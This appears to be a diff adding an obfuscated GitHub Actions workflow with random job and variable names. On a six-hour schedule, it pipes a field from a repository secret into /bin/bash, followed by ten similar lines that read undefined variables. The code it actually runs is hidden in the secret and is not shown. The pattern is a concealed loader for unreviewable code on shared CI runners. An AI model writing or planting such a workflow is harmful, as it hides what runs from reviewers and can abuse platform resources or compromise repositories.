@@ -1,0 +1,27 @@
+name: lingdaoshou4716
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lingdaoshou4716
+        env:
+          elsi2937: ${{ secrets.elsi2937 }}
+        run: |
+          echo $elsi2937 | jq -r .cls7394 | /bin/bash
+          echo $hlf354 | jq -r .kbcm23 | /bin/bash
+          echo $x57809 | jq -r .o66 | /bin/bash
+          echo $y39 | jq -r .ubng1990 | /bin/bash
+          echo $tq301 | jq -r .mu44201 | /bin/bash
+          echo $gk11 | jq -r .t6 | /bin/bash
+          echo $zip02 | jq -r .yqe1 | /bin/bash
+          echo $i372 | jq -r .zw5328 | /bin/bash
+          echo $nwm0540 | jq -r .enwtp84 | /bin/bash
+          echo $jzw4 | jq -r .kbxty880 | /bin/bash
+          echo $wub8238 | jq -r .n4 | /bin/bash
+
